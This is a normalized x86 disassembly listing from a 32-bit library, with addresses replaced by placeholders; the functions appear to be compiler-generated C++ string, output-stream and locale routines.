call sub_10011c26
push [ esi + 0x14 ]
call sub_10011c26
add esp 0xc
mov [ esi ] r--data
pop esi
retn
sub_100060ef
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
mov edi [ esp + 0x10 ]
mov esi eax
push edi
mov ecx esi
call sub_10002241
test al al
je r-xdata
or eax 0xffffffff
sub eax [ esi + 0x14 ]
cmp eax ebx
jbe r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
call sub_1000f9c4
mov eax [ esi + 0x14 ]
lea ecx [ eax + ebx ]
cmp ecx eax
jae r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
test ebx ebx
jbe r-xdata
pop edi
pop esi
pop ebx
retn 0x8
sub edi eax
push ebx
push edi
mov eax esi
call sub_1000637a
jmp r-xdata
mov eax esi
mov edi [ esi + 0x14 ]
push 0x0
add edi ebx
push edi
mov ecx esi
call sub_10001cc3
test al al
je r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0x10
jb r-xdata
lea edx [ esi + 0x4 ]
mov edx [ esi + 0x4 ]
jmp r-xdata
mov ecx [ esi + 0x14 ]
push ebx
push [ esp + 0x14 ]
sub eax ecx
push eax
add ecx edx
push ecx
call sub_1000102e
add esp 0x10
push edi
mov ecx esi
call sub_10001ca7
sub_10006189
push ebp
mov ebp esp
push ecx
cmp [ esi + 0x14 ] edi
jae r-xdata
or eax 0xffffffff
sub eax [ esi + 0x14 ]
cmp eax [ ebp + 0x8 ]
ja r-xdata
call sub_1000f9fc
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
call sub_1000f9c4
mov eax esi
leave
retn 0x8
push ebx
mov ebx [ esi + 0x14 ]
add ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx esi
call sub_10001cc3
test al al
je r-xdata
pop ebx
mov eax [ esi + 0x18 ]
lea ecx [ esi + 0x4 ]
cmp eax 0x10
jb r-xdata
mov [ ebp - 0x4 ] ecx
mov edx [ ecx ]
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov edx [ esi + 0x14 ]
sub edx edi
push edx
mov edx [ ebp - 0x4 ]
sub eax edi
sub eax [ ebp + 0x8 ]
add edx edi
push edx
add ecx edi
add ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_1000104a
mov dl [ ebp + 0xc ]
add esp 0x10
push [ ebp + 0x8 ]
mov ecx edi
mov eax esi
call sub_10005342
push ebx
mov ecx esi
call sub_10001ca7
mov ecx [ ecx ]
cmp eax 0x10
jb r-xdata
sub_1000621c
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp edi [ esi + 0x14 ]
jbe r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
call sub_10010b92
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
lea eax [ esi + edi ]
pop edi
pop esi
retn 0x4
sub_10006244
and [ edi ] 0x0
test esi esi
je r-xdata
call sub_10010b92
test ebx ebx
je r-xdata
mov edx [ esi + 0x18 ]
lea eax [ esi + 0x4 ]
cmp edx 0x10
jb r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
cmp edx 0x10
jb r-xdata
cmp ecx ebx
ja r-xdata
mov ecx [ esi + 0x14 ]
add ecx eax
cmp ebx ecx
jbe r-xdata
mov eax [ eax ]
mov [ edi ] esi
mov [ edi + 0x4 ] ebx
mov eax edi
retn
sub_10006281
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
push esi
mov esi eax
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x4 ] eax
mov eax ebx
pop esi
pop ebp
retn
push edi
mov edi ecx
add edi 0x8
mov [ ebp + 0x8 ] 0x1
call sub_10007a82
mov ecx 0xffff
cmp cx ax
jne r-xdata
movzx eax [ esi ]
push edi
push eax
call sub_10007edb
pop ecx
pop ecx
mov ecx [ ebp + 0xc ]
movzx edx ax
test ecx ecx
je r-xdata
pop edi
dec [ ebp + 0x10 ]
inc esi
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
sub_100062d7
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
mov edi eax
mov ecx [ ebp + 0x8 ]
push esi
push [ ebp + 0x1c ]
mov eax edi
push [ ebp + 0x18 ]
lea ebx [ ebp - 0x8 ]
call sub_10006281
mov ecx [ eax ]
mov [ ebp + 0x18 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0xc
add edi esi
sub [ ebp + 0x10 ] esi
mov [ ebp + 0x1c ] ecx
je r-xdata
sub eax edi
mov esi eax
mov edx [ eax ]
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
pop edi
pop esi
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebx
leave
retn
cmp [ ebp + 0x14 ] 0x0
je r-xdata
inc edi
dec [ ebp + 0x10 ]
jmp r-xdata
push 0x1
push [ ebp + 0x14 ]
lea esi [ ebp - 0x10 ]
push [ eax + 0x4 ]
push [ eax ]
call sub_10005fe5
mov ecx [ eax ]
mov [ ebp + 0x18 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x10
mov [ ebp + 0x1c ] eax
mov esi [ ebp + 0x10 ]
push esi
push 0x0
push edi
call sub_10011b30
add esp 0xc
test eax eax
je r-xdata
sub_1000637a
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0xc ]
push edi
mov edi eax
mov eax [ edi + 0x14 ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov eax [ edi + 0x14 ]
sub eax [ ebp + 0x8 ]
cmp eax ebx
jae r-xdata
call sub_1000f9fc
or eax 0xffffffff
sub eax [ esi + 0x14 ]
cmp eax ebx
jbe r-xdata
mov ebx eax
mov [ ebp + 0xc ] ebx
call sub_1000f9c4
mov eax [ esi + 0x14 ]
lea ecx [ eax + ebx ]
cmp ecx eax
jae r-xdata
test ebx ebx
jbe r-xdata
pop edi
mov eax esi
pop ebx
leave
retn 0x8
mov eax [ esi + 0x14 ]
add eax ebx
push 0x0
push eax
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_10001cc3
test al al
je r-xdata
cmp [ edi + 0x18 ] 0x10
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
lea edx [ esi + 0x4 ]
mov edx [ esi + 0x4 ]
jmp r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0x10
jb r-xdata
push [ ebp + 0xc ]
mov ecx [ esi + 0x14 ]
mov ebx [ ebp + 0x8 ]
add edi ebx
sub eax ecx
push edi
push eax
add ecx edx
push ecx
call sub_1000102e
add esp 0x10
push [ ebp - 0x4 ]
mov ecx esi
call sub_10001ca7
sub_1000641e
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_10007198
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
leave
retn
sub_10006439
cmp [ ecx + 0x18 ] 0x8
push edi
mov edi [ ecx + 0x14 ]
jb r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
push ecx
mov ecx [ eax + 0x14 ]
call sub_10006eee
neg eax
sbb eax eax
inc eax
pop edi
retn
sub_1000645b
push 0x20
mov eax sub_10027463
call sub_10014213
push [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
lea esi [ ebp - 0x2c ]
call sub_10001738
mov ecx eax
mov eax [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
push 0xffffffff
push 0x0
call sub_10006f31
mov esi [ ebp + 0x8 ]
push eax
call sub_10001738
push 0x0
push 0x1
lea esi [ ebp - 0x2c ]
call sub_10001a52
mov eax [ ebp + 0x8 ]
call sub_100142eb
retn
sub_100064a6
push 0x20
mov eax sub_10027463
call sub_10014213
push [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
lea esi [ ebp - 0x2c ]
call sub_10001738
mov esi eax
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
call sub_10010a1b
pop ecx
push [ ebp + 0x10 ]
mov ebx eax
mov eax esi
call sub_10006fd8
mov esi [ ebp + 0x8 ]
push eax
call sub_10001738
push 0x0
push 0x1
lea esi [ ebp - 0x2c ]
call sub_10001a52
mov eax [ ebp + 0x8 ]
call sub_100142eb
retn
sub_100064fa
push 0x14
mov eax sub_10028280
call sub_10014246
mov edi [ ebp + 0x8 ]
push [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x18 ] ebx
call sub_10010a1b
mov esi eax
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi + 0x18 ]
cmp eax ebx
pop ecx
jle r-xdata
lea eax [ ebp - 0x20 ]
push eax
call sub_10007618
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
cmp eax esi
jle r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov [ ebp - 0x18 ] 0x4
jmp r-xdata
sub eax esi
mov ebx eax
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + edi + 0x28 ]
mov eax [ ecx ]
push esi
push [ ebp + 0xc ]
call [ eax + 0x20 ]
cmp eax esi
je r-xdata
test ebx ebx
jle r-xdata
mov eax [ edi ]
mov edx [ eax + 0x4 ]
add edx edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
test ebx ebx
jle r-xdata
mov [ ebp - 0x18 ] 0x4
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
movzx edx [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
mov ecx eax
call sub_10007a82
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x20 ]
push eax
call sub_100075d2
mov eax edi
call sub_100142eb
retn
push 0x0
push [ ebp - 0x18 ]
call sub_100085e2
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
and [ eax + 0x18 ] 0x0
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
movzx edx [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
mov ecx eax
call sub_10007a82
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
dec ebx
jmp r-xdata
or [ ebp - 0x18 ] 0x4
dec ebx
jmp r-xdata
or [ ebp - 0x18 ] 0x4
jmp r-xdata
sub_1000661e
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_100084c5
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_10006651
push 0x18
mov eax sub_1002825b
call sub_10014246
mov ebx ecx
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi + 0x18 ]
mov ecx [ ebx + 0x14 ]
xor esi esi
cmp eax esi
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x1c ] ecx
jle r-xdata
mov [ ebp - 0x18 ] esi
cmp eax ecx
jbe r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
sub eax ecx
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp esi [ ebp - 0x1c ]
jae r-xdata
cmp [ ebp - 0x18 ] esi
jbe r-xdata
mov eax [ edi ]
mov edx [ eax + 0x4 ]
add edx edi
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_10007618
mov [ ebp - 0x4 ] esi
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp esi [ ebx + 0x14 ]
jbe r-xdata
cmp [ ebp - 0x14 ] esi
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
movzx edx [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
mov ecx eax
call sub_10007a82
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x24 ]
push eax
call sub_100075d2
mov eax edi
call sub_100142eb
retn
push 0x0
push [ ebp - 0x14 ]
call sub_100085e2
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
and [ eax + 0x18 ] 0x0
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x18 ] 0x0
jbe r-xdata
cmp [ ebx + 0x18 ] 0x8
jb r-xdata
call sub_10010b92
dec [ ebp - 0x18 ]
jmp r-xdata
or [ ebp - 0x14 ] 0x4
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
movzx edx [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
mov ecx eax
call sub_10007a82
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
lea eax [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
jmp r-xdata
dec [ ebp - 0x18 ]
jmp r-xdata
or [ ebp - 0x14 ] 0x4
inc esi
jmp r-xdata
or [ ebp - 0x14 ] 0x4
mov ecx [ edi ]
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx + edi + 0x28 ]
mov dx [ eax + esi * 2 ]
call sub_10007a82
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
sub_100067aa
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_100084c5
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_100067da
push 0x20
mov eax sub_10028236
call sub_10014246
mov edi [ ebp + 0x8 ]
mov eax r--data
xor esi esi
push eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x14 ] esi
call sub_10010990
mov ebx eax
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi + 0x18 ]
cmp eax esi
pop ecx
jle r-xdata
mov [ ebp - 0x18 ] esi
cmp eax ebx
jle r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
lea esi [ ebp - 0x20 ]
call sub_10008382
push eax
mov [ ebp - 0x4 ] 0x2
call sub_100079e4
pop ecx
lea ecx [ ebp - 0x20 ]
mov esi eax
mov [ ebp - 0x4 ] 0x1
call sub_100086e3
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov [ ebp - 0x14 ] 0x4
jmp sub_1000695b
sub eax ebx
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
push eax
call sub_10007618
mov [ ebp - 0x4 ] esi
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
and [ eax + 0x18 ] 0x0
and [ ebp - 0x4 ] 0x0
jmp sub_1000695b
test ebx ebx
jle r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
movzx edx [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
mov ecx eax
call sub_10007a82
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
jle r-xdata
mov eax [ ebp - 0x1c ]
mov al [ eax ]
mov [ ebp - 0x24 ] al
push [ ebp - 0x24 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x28 ]
movzx edx ax
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + edi + 0x28 ]
call sub_10007a82
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
dec [ ebp - 0x18 ]
jmp r-xdata
or [ ebp - 0x14 ] 0x4
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
movzx edx [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
mov ecx eax
call sub_10007a82
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
dec ebx
inc [ ebp - 0x1c ]
jmp r-xdata
mov [ ebp - 0x14 ] 0x4
dec [ ebp - 0x18 ]
jmp r-xdata
or [ ebp - 0x14 ] 0x4
sub_1000692d
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_100084c5
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_1000695b
mov eax [ edi ]
mov edx [ eax + 0x4 ]
add edx edi
cmp [ ebp - 0x14 ] 0x0
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x2c ]
push eax
call sub_100075d2
mov eax edi
call sub_100142eb
retn
push 0x0
push [ ebp - 0x14 ]
call sub_100085e2
sub_10006987
push 0x1c
mov eax sub_10027f4b
call sub_10014246
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x14 ]
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi + 0x18 ]
xor ebx ebx
cmp eax ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x20 ] ecx
jle r-xdata
mov [ ebp - 0x1c ] ebx
cmp eax ecx
jbe r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov [ ebp - 0x18 ] 0x4
jmp r-xdata
sub eax ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
xor edi edi
cmp [ ebp - 0x1c ] ebx
jbe r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
add edx esi
cmp [ ebp - 0x18 ] ebx
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov edi esi
call sub_10007618
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
cmp [ ebp - 0x18 ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + esi + 0x28 ]
mov eax [ ebp + 0xc ]
call sub_1000757c
mov dl [ eax ]
mov ecx ebx
call sub_1000759c
cmp eax 0xffffffff
jne r-xdata
cmp [ ebp - 0x18 ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov dl [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
mov ecx eax
call sub_1000759c
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x28 ]
push eax
call sub_100075d2
mov eax esi
call sub_100142eb
retn
push ebx
push [ ebp - 0x18 ]
call sub_100085e2
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov [ eax + 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x1c ] ebx
jbe r-xdata
inc edi
xor ebx ebx
jmp r-xdata
or [ ebp - 0x18 ] 0x4
xor ebx ebx
dec [ ebp - 0x1c ]
jmp r-xdata
or [ ebp - 0x18 ] 0x4
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov dl [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
mov ecx eax
call sub_1000759c
cmp eax 0xffffffff
jne r-xdata
cmp edi [ ebp - 0x20 ]
jae r-xdata
dec [ ebp - 0x1c ]
jmp r-xdata
or [ ebp - 0x18 ] 0x4
sub_10006ac0
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_100084c5
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_10006af2
push 0x14
mov eax sub_10027440
call sub_10014213
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000fe10
and [ ebp - 0x4 ] 0x0
mov edi [ rw-data ]
mov esi rw-data
mov [ ebp - 0x10 ] edi
call sub_10007ab9
mov esi eax
mov eax [ ebp + 0x8 ]
call sub_10007aea
mov esi eax
test esi esi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1000fe38
mov eax esi
call sub_100142eb
retn
test edi edi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10006cec
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov esi edi
jmp r-xdata
mov esi [ ebp - 0x10 ]
mov ecx esi
mov [ rw-data ] esi
call sub_100086fb
push esi
call sub_1000fbb3
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100108f6
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10013de1
sub_10006b90
push 0x14
mov eax sub_10027440
call sub_10014213
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000fe10
and [ ebp - 0x4 ] 0x0
mov edi [ rw-data ]
mov esi rw-data
mov [ ebp - 0x10 ] edi
call sub_10007ab9
mov esi eax
mov eax [ ebp + 0x8 ]
call sub_10007aea
mov esi eax
test esi esi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1000fe38
mov eax esi
call sub_100142eb
retn
test edi edi
je r-xdata
push [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
call sub_10006da4
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov esi edi
jmp r-xdata
mov esi [ ebp - 0x10 ]
mov ecx esi
mov [ rw-data ] esi
call sub_100086fb
push esi
call sub_1000fbb3
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100108f6
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10013de1
sub_10006c2c
push 0x14
mov eax sub_10027440
call sub_10014213
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000fe10
and [ ebp - 0x4 ] 0x0
mov edi [ rw-data ]
mov esi rw-data
mov [ ebp - 0x10 ] edi
call sub_10007ab9
mov esi eax
mov eax [ ebp + 0x8 ]
call sub_10007aea
mov esi eax
test esi esi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1000fe38
mov eax esi
call sub_100142eb
retn
test edi edi
je r-xdata
push [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
call sub_10006e41
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov esi edi
jmp r-xdata
mov esi [ ebp - 0x10 ]
mov ecx esi
mov [ rw-data ] esi
call sub_100086fb
push esi
call sub_1000fbb3
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100108f6
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10013de1
sub_10006cc8
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_10007495
add esp 0xc
pop edi
leave
retn 0x8
sub_10006cec
push 0x98
mov eax sub_10026c98
call sub_10014213
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp eax edi
je r-xdata
push 0x4
pop eax
call sub_100142eb
retn
cmp [ eax ] edi
jne r-xdata
push 0x10
call sub_10010c96
mov esi eax
pop ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] edi
cmp esi edi
je r-xdata
xor esi esi
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0xc ]
call sub_10007cfd
push eax
lea eax [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x1
push eax
mov [ ebp - 0x10 ] 0x1
call sub_10007ca8
mov [ ebp - 0x10 ] 0x3
mov [ esi + 0x4 ] edi
mov [ esi ] r--data
call sub_100105a7
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea eax [ ebp - 0xa4 ]
push eax
call sub_10007d1a
mov ecx [ ebp + 0x8 ]
push 0x2
pop eax
mov [ ebp - 0x4 ] eax
mov [ ecx ] esi
test [ ebp - 0x10 ] al
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_1000197b
sub_10006da4
push 0x98
mov eax sub_10026c98
call sub_10014213
xor ebx ebx
mov [ ebp - 0x10 ] ebx
cmp edi ebx
je r-xdata
push 0x2
pop eax
call sub_100142eb
retn
cmp [ edi ] ebx
jne r-xdata
push 0x8
call sub_10010c96
mov esi eax
pop ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
inc ebx
test esi esi
je r-xdata
xor esi esi
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_10007cfd
push eax
lea eax [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] bl
push eax
mov [ ebp - 0x10 ] ebx
call sub_10007ca8
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x3
mov [ esi ] r--data
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea eax [ ebp - 0xa4 ]
push eax
call sub_10007d1a
mov [ ebp - 0x4 ] 0x2
test [ ebp - 0x10 ] 0x2
mov [ edi ] esi
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x30 ]
call sub_1000197b
sub_10006e41
push 0x98
mov eax sub_10026ed6
call sub_10014213
xor ebx ebx
mov [ ebp - 0x10 ] ebx
cmp edi ebx
je r-xdata
push 0x4
pop eax
call sub_100142eb
retn
cmp [ edi ] ebx
jne r-xdata
push 0x18
call sub_10010c96
mov esi eax
pop ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
inc ebx
test esi esi
je r-xdata
xor esi esi
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_10007cfd
push eax
lea eax [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] bl
push eax
mov [ ebp - 0x10 ] ebx
call sub_10007ca8
and [ esi + 0x4 ] 0x0
push 0x3
pop eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
push esi
mov [ esi ] r--data
call sub_1000706e
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea eax [ ebp - 0xa4 ]
push eax
call sub_10007d1a
mov [ ebp - 0x4 ] 0x4
test [ ebp - 0x10 ] 0x2
mov [ edi ] esi
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x30 ]
call sub_1000197b
sub_10006eee
push esi
mov esi ecx
mov ecx [ eax + 0x14 ]
cmp ecx esi
jae r-xdata
mov edx esi
cmp esi edi
jb r-xdata
mov esi ecx
cmp [ eax + 0x18 ] 0x8
jb r-xdata
mov edx edi
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
pop esi
retn 0x4
cmp esi edi
jae r-xdata
mov ecx [ esp + 0x8 ]
call sub_10007556
test eax eax
jne r-xdata
xor eax eax
cmp esi edi
setne al
or eax 0xffffffff
jmp r-xdata
sub_10006f31
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov eax [ ebx + 0x14 ]
sub eax [ ebp + 0x8 ]
cmp eax edi
jae r-xdata
call sub_1000f9fc
or eax 0xffffffff
sub eax [ esi + 0x14 ]
cmp eax edi
jbe r-xdata
mov edi eax
mov [ ebp + 0xc ] edi
call sub_1000f9c4
mov eax [ esi + 0x14 ]
lea ecx [ eax + edi ]
cmp ecx eax
jae r-xdata
test edi edi
jbe r-xdata
pop edi
mov eax esi
pop esi
pop ebx
leave
retn 0x8
mov eax [ esi + 0x14 ]
add eax edi
mov edi eax
mov [ ebp - 0x4 ] eax
call sub_10001e1d
test al al
je r-xdata
cmp [ ebx + 0x18 ] 0x8
jb r-xdata
add ebx 0x4
mov ebx [ ebx + 0x4 ]
jmp r-xdata
lea edx [ esi + 0x4 ]
mov edx [ esi + 0x4 ]
jmp r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0x8
jb r-xdata
mov ecx [ esi + 0x14 ]
mov edi [ ebp + 0x8 ]
sub eax ecx
lea edi [ ebx + edi * 2 ]
push edi
push eax
lea eax [ edx + ecx * 2 ]
push eax
mov eax [ ebp + 0xc ]
call sub_100023dd
mov ecx [ ebp - 0x4 ]
add esp 0xc
mov eax esi
call sub_10001e05
sub_10006fd8
push esi
push edi
mov edi [ esp + 0xc ]
mov esi eax
push edi
mov ecx esi
call sub_10002357
test al al
je r-xdata
or eax 0xffffffff
sub eax [ esi + 0x14 ]
cmp eax ebx
jbe r-xdata
